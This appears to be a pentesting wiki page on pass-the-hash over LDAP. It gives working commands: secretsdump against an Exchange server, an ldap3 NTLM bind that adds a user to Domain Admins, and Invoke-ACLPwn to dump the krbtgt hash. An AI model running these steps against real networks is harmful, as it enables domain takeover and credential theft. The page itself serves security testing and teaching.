# LDAP (PTH)

## Theory and practice

Active Directory is Windows' implementation of a general purpose directory service, which uses LDAP as its primary access protocol.

I often find that the best Active Directory attack chains usually involve exploiting ACLs. Consider a common penetration testing scenario: You have gained access to an NT hash from a user in an IT administration group that has administrator access over an exchange server. You do not have administrator access to domain controllers. Exchange servers are members of the Exchange Trusted Subsystem group, which is a member of the Exchange Windows Permissions group. This group has WriteDACL access over the domain. It is also important to know that computer accounts have usernames and passwords, and that these passwords are effectively uncrackable, so passing the hash is extremely useful.

First, retrieve the NT hash for the Exchange server.

```bash
secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
 
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
DOMAIN\EXCHANGE$:aes256-cts-hmac-sha1-96:fbc8df96a7709ec33edc50d2d9394d8e28c6bc65697f9bdfaf78009850cfa69d
DOMAIN\EXCHANGE$:aes128-cts-hmac-sha1-96:fe0acc236a82bd74fdcaa593f51481f2
DOMAIN\EXCHANGE$:des-cbc-md5:cd4308d6f285fc82
DOMAIN\EXCHANGE$:aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248:::
```

Once you have the NT hash for the Exchange server, you can authenticate to a domain controller using `ldap3`, and authenticate by passing the hash. From here you can do many things, but a simple attack is to add a user that you control to the **Domain Admins** group. In this example, of course, you can also use the Exchange account for DCsync with secretsdump.py. In the case of compromising the NT hash of a member of the **Account Operators** group, you would not be able to DCsync however, you could use this method to add users to certain groups to extend access.

```python
python3
>>> import ldap3
>>> user = 'DOMAIN\\EXCHANGE$'
>>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
>>> server = ldap3.Server('DOMAIN.LOCAL')
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
>>> connection.bind()
>>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
>>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
>>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
>>> addUsersInGroups(connection, user_dn, group_dn)
True
```

Another thing we can use, is the PowerShell script Invoke-ACLpwn, which can be used to make the modification in the domain ACL for the user to get the following privileges:

* Replicate directory changes
* Replicate directory changes All

The script requires `SharpHound.exe` to retrieve access control entries (ACE) and enumerate domain objects and `mimikatz.exe` for DCSync operations (dump Kerberos account password hash). The following command can be executed to retrieve the Kerberos account hash (krbtgt).

```powershell
.\Invoke-ACLPwn.ps1 -SharpHoundLocation .\SharpHound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn krbtgt
```

### References

{% embed url="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl" %}

{% embed url="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth" %}

